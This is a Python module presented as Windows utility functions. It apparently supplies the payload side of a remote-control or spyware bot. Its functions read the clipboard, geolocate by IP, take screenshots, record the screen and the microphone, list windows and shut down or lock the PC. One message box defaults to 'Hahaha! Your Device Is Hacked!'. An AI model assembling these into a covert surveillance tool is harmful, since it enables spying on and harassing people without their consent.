"""
Utility Functions
------------------------
Collection of utility functions for basic system control,
screen capture, window management, notifications, and
simple automation tasks.
"""

import os
import time
import random
import ctypes
import subprocess
import socket
import wave
import cv2
import mss
import numpy as np
import pyautogui
import pygetwindow as gw
import winsound
import psutil
import requests
import speedtest
import pyperclip
import sounddevice as sd

# ============================================================================
# SYSTEM CONTROL & INFO FUNCTIONS
# ============================================================================

def shutdown_pc():
    """Shutdown the computer after 5 seconds."""
    os.system("shutdown /s /t 5")


def sleep_pc():
    """Put the computer into sleep mode."""
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")


def lock_pc():
    """Lock the Windows workstation."""
    ctypes.windll.user32.LockWorkStation()


def get_system_info():
    """
    Gather hardware and network information.
    """
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    storage = psutil.disk_usage('C:\\').percent
    
    battery = psutil.sensors_battery()
    battery_str = f"{battery.percent}% {'🔌 (Charging)' if battery.power_plugged else '🔋 (Discharging)'}" if battery else "N/A"
    
    try:
        ip_add = requests.get('https://api.ipify.org', timeout=3).text
    except requests.RequestException:
        ip_add = "Unavailable"

    return (
        "💻 *System Information*\n\n"
        f"🔥 CPU Usage: {cpu}%\n"
        f"🧠 RAM Usage: {ram}%\n"
        f"💽 Storage (C:): {storage}%\n"
        f"🔋 Battery: {battery_str}\n"
        f"🌐 Public IP: `{ip_add}`"
    )


def run_speed_test():
    """
    Perform an internet speed test.
    """
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000  # Convert to Mbps
        upload_speed = st.upload() / 1_000_000      # Convert to Mbps
        return (
            "🚀 *Internet Speed Test Results*\n\n"
            f"📥 Download: `{download_speed:.2f} Mbps`\n"
            f"📤 Upload: `{upload_speed:.2f} Mbps`"
        )
    except Exception as e:
        return f"❌ Speed test failed: {str(e)}"


# ============================================================================
# WINDOW & PERIPHERAL MANAGEMENT
# ============================================================================

def app_close():
    """Close the currently active window."""
    pyautogui.hotkey("alt", "f4")
    time.sleep(1)
    pyautogui.press("enter")


def get_open_windows():
    """Get titles of all open windows."""
    return [window.title for window in gw.getAllWindows() if window.title]


def get_clipboard_text():
    """Retrieve text stored in the system clipboard."""
    try:
        text = pyperclip.paste()
        return text if text.strip() else "📋 Clipboard is currently empty or contains non-text data."
    except Exception as e:
        return f"❌ Failed to read clipboard: {str(e)}"


def get_mouse_position():
    """Retrieve current coordinates of the mouse cursor."""
    x, y = pyautogui.position()
    return f"📍 *Mouse Position*:\nX: `{x}` | Y: `{y}`"


def get_location_by_ip():
    """Get rough location details based on public IP address."""
    try:
        res = requests.get('http://ip-api.com/json/', timeout=4).json()
        if res.get('status') == 'success':
            return (
                "📍 *IP-Based Location*\n\n"
                f"🏳️ Country: {res.get('country')}\n"
                f"🏙️ City: {res.get('city')}\n"
                f"🗺️ Lat/Lon: {res.get('lat')}, {res.get('lon')}\n"
                f"🏢 ISP: {res.get('isp')}"
            )
        return "❌ Location data status returned failure."
    except Exception:
        return "❌ Could not fetch location details."


# ============================================================================
# SCREEN CAPTURE FUNCTIONS
# ============================================================================

def screenshot(filename="screenshot.png"):
    """Capture a screenshot of the current screen."""
    pyautogui.screenshot().save(filename)


def screen_rec(duration=8, filename="screen_rec.mp4"):
    """Record the screen for a specified duration."""
    with mss.mss() as monitor_capture:
        monitor = monitor_capture.monitors[1]
        video_writer = cv2.VideoWriter(
            filename,
            cv2.VideoWriter_fourcc(*"mp4v"),
            20,
            (monitor["width"], monitor["height"])
        )
        start_time = time.time()
        while time.time() - start_time < duration:
            frame = np.array(monitor_capture.grab(monitor))
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            video_writer.write(frame)
        video_writer.release()


# ============================================================================
# APPLICATION, MEDIA & AUDIO UTILITIES
# ============================================================================

def random_app_open():
    """Open a random application from a predefined list."""
    apps = ["notepad", "calc", "cmd"]
    subprocess.Popen(random.choice(apps))


def play_sound():
    """Play a beep sound."""
    winsound.Beep(1000, 2000)


def media_control(action):
    """Simulate media keys execution."""
    actions = {
        "mute": "volumemute",
        "volup": "volumeup",
        "voldown": "volumedown",
        "play_pause": "playpause",
        "next": "nexttrack",
        "prev": "prevtrack"
    }
    if action in actions:
        pyautogui.press(actions[action])


def record_microphone(duration=10, filename="mic_rec.wav"):
    """
    Record audio from the active system default input device.
    (Windows prioritizes connected Bluetooth headset microphones automatically).
    """
    fs = 44100  # Sample Rate
    # Records using default input device
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
    sd.wait()  # Wait for recording completion
    
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)  # 16-bit format
        wf.setframerate(fs)
        wf.writeframes(recording.tobytes())


# ============================================================================
# NOTIFICATION FUNCTIONS
# ============================================================================

def notification(title="AlphaX", msg="Hahaha! Your Device Is Hacked!"):
    """Display a Windows message box notification."""
    ctypes.windll.user32.MessageBoxW(0, msg, title, 0)